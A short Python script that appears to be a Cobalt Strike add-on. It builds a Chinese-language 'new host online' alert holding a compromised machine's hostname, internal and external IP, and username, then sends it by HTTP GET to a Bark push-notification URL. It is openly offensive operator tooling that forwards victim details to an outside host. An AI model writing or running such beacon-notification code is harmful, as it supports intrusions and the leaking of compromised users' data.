import requests
import random
import argparse
import string


def cs_xx():
    parser = argparse.ArgumentParser(description='Beacon Info')
    parser.add_argument('--computername')
    parser.add_argument('--internalip')
    parser.add_argument('--externalip')
    parser.add_argument('--username')
    args = parser.parse_args()

    internalip = args.internalip
    externalip = args.externalip
    computername = args.computername
    username = args.username
    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))

    content = """CobaltStrike 上线提醒\n ───────😯─────── \n您有新主机上线啦 ！\n主机名：{}\n内部IP：{}\n外部IP：{}\n用户名：{}\nToken：{}\n请注意查收哦 ~\n ───────😯─────── """.format(computername, internalip, externalip, username, ran_str)
    return content

def bark_tui(url,msg):
    session = requests.Session()
    response = session.get(url+msg)

    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)

if __name__ == "__main__":
    msg = cs_xx()
    bark_url = 'url'
    bark_tui(bark_url,msg)